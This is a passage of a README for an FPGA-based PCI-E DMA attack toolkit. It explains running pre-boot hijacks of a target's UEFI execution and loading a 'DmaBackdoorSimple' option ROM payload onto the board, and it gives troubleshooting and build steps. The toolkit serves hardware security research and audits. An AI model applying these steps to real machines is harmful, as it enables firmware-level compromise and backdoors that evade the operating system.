By default all four programs are using EFI system table hijack method, to use protocol entry method instead you can pass `--inj-prot` command line option to the appropriate program. To reduce amount of time required to perform the attack you can specify previously found `EFI_SYSTEM_TABLE` structure address using `--system-table` option and `PROTOCOL_ENTRY` structure address using `--prot-entry` option. Also, all four Python programs has `--test` command line option, this option is used to do the memory scan and find required structures addresses without performing an actual hijack of the execution flow. So, during the first boot you can run desired program with `--test` option to find needed address and during the second boot you can run the same program with `--system-table` or `--prot-entry` option to specify that address.  

During development of malicious code for pre-boot DMA attacks it's important to have an information about execution environment of UEFI DXE phase. To collect such information you can turn the target computer on, enter into the BIOS setup menu or boot options menu to pause loading of the operating system and run `uefi.py` program without arguments. This program will scan physical memory of the target computer and print various information about existing UEFI DXE protocols and interfaces, loaded UEFI drivers, UEFI descriptor tables and ACPI tables. Here you can see [an example](https://gist.github.com/Cr4sh/206daf97b57c050392415616a30c3ca9) of information obtained by `uefi.py` program while using [AAEON UP Squared](https://www.aaeon.com/en/p/iot-gateway-maker-boards-up-squared) mini-PC as attack target.


## Option ROM attacks

Provided bitstream can emulate PCI-E option ROM stored in onboard linear flash memory of SP605. Although modern platforms [mitigates](https://docs.microsoft.com/en-us/windows-hardware/manufacture/desktop/uefi-validation-option-rom-validation-guidance) option ROM [attacks](https://trmm.net/Thunderstrike), this feature still could be useful for security audit or prototyping purposes.

You can manage option ROM images using `pcie_rom_ctl.py` Python program.  
Erasing option ROM contents:

```
$ ./pcie_rom_ctl.py --erase
[+] Opening PCI-E device...
[+] Enabling resident mode...
[+] Erasing option ROM...
[+] Done
```

Loading provided UEFI option ROM example into the board:

```
$ ./pcie_rom_ctl.py --load payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64_10ee_1337.rom
[+] Opening PCI-E device...
[+] Enabling resident mode...
[+] Erasing option ROM...
[+] Loading 5120 bytes of option ROM...
[+] Done
```

Also, there's an option to log option ROM memory access into the debug UART of SP605 board, to enable or disable this option use `--log-on` and `--log-off` parameters of `./pcie_rom_ctl.py` program.

To verify correct operation of the option ROM support under the Linux you can do the following.  
First, find bus-device-function address of SP605 PCI-E device:

```
# lspci | grep Xilinx
01:00.0 Ethernet controller: Xilinx Corporation Device 1337
```

Then, set enabled bit of the command register so target system will pass to the PCI-E device all of the memory access attempts to the option ROM physical memory rages:

```
# echo 1 > /sys/bus/pci/devices/0000\:01\:00.0/enable
# echo 1 > /sys/bus/pci/devices/0000\:01\:00.0/rom
```

Now you can dump contents of the previously loaded option ROM with the help of `dd` command and appropriate pseudo-file of sysfs:

```
# dd if=/sys/bus/pci/devices/0000\:01\:00.0/rom | hexdump -Cv
00000000  55 aa 0b 00 f1 0e 00 00  0b 00 64 86 00 00 00 00  |U.........d.....|
00000010  00 00 00 00 00 00 60 00  1c 00 00 00 50 43 49 52  |......`.....PCIR|
00000020  ee 10 37 13 00 00 1c 00  03 00 00 00 0b 00 00 00  |..7.............|
00000030  03 80 00 00 00 00 00 00  ff ff ff ff ff ff ff ff  |................|
00000040  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000050  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
00000060  4d 5a 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |MZ..............|
00000070  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000080  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
00000090  00 00 00 00 00 00 00 00  00 00 00 00 b8 00 00 00  |................|
000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000b0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
000000c0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

...

```

In case when `--log-on` option of `pcie_rom_ctl.py` program was specified during the configuration you will see the following messages in the debug UART console of SP605 board while dumping the option ROM:

```
ROM read: size = 2, offset = 0x0
ROM read: size = 2, offset = 0x18
ROM read: size = 4, offset = 0x1C
ROM read: size = 1, offset = 0x31
ROM read: size = 2, offset = 0x2C
ROM read: size = 1, offset = 0x0
ROM read: size = 2, offset = 0x0
ROM read: size = 2, offset = 0x18
ROM read: size = 4, offset = 0x1C
ROM read: size = 1, offset = 0x31
ROM read: size = 2, offset = 0x2C
ROM read: size = 1, offset = 0x1
ROM read: size = 2, offset = 0x0
ROM read: size = 2, offset = 0x18
ROM read: size = 4, offset = 0x1C
ROM read: size = 1, offset = 0x31
ROM read: size = 2, offset = 0x2C

...

```

## Troubleshooting

PCI Express is very complicated high speed bus so there's a lot of things that can go wrong. In case when DMA attack is not working on your setup you can check the following things to determine an exact problem:

* `DS3` LED is on when physical PCI-E link is up and `DS4` is on when root complex had assigned bus-device-function address to our PCI-E endpoint. If `DS3` is off it likely means physical connectivity issue &minus; check your risers, cables, etc. If `DS3` is on but `DS4` is off it means that you had to reboot your attack target or force PCI-E devices rescan on its side. 

* `DS5` LED is on during PCI-E bus reset, when it always on it means physical connectivity issue.

* If root complex sends Cpl TLP instead of CplD TLP in reply to memory read request it means that memory access was rejected because of invalid address or IOMMU enforced access checks. Also, typical x86 machine might not reply at all on memory read requests to certain MMIO regions of physical address space. 

* If software is receiving inconsistent or invalid TLPs from the root complex in reply to the memory read requests you might try to set a smaller value of `MEM_RD_TLP_LEN` constant in `pcie_lib.py` to split reply data into more smaller chunks. Also it's useful to run the program with `DEBUG_TLP=1` environment variable and check raw TX/RX TLPs dump.


## Building project from the source code

1) Install Xilinx ISE 13.4 which comes with your SP605 board and open `s6_pcie_microblaze.xise` project file.

2) Regenerate `s6_pcie_v2_4` and `fifo_generator_v8_4` cores which presents in project hierarchy. 

3) Click on `microblaze_i` instance in project hierarchy and run "Export Hardware Design to SDK With Bitstream".

4) When build will be completed ISE opens Xilinx Software Development Kit IDE, use `sdk` folder as it's workspace. 

5) Create new standalone board support package in your Xilinx SDK project tree, choose lwIP and xilflash libraries in BSP configuration. 

6) Import `sdk/srec_bootloader_0` and `sdk/main_0` projects into the project tree and run the build.

7) Run `make bitstream && make srec` from Xilinx ISE command prompt to generate needed output files. 


## Developed by

Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com<br/>
http://blog.cr4.sh<br/>
[@d_olex](http://twitter.com/d_olex)<br/>

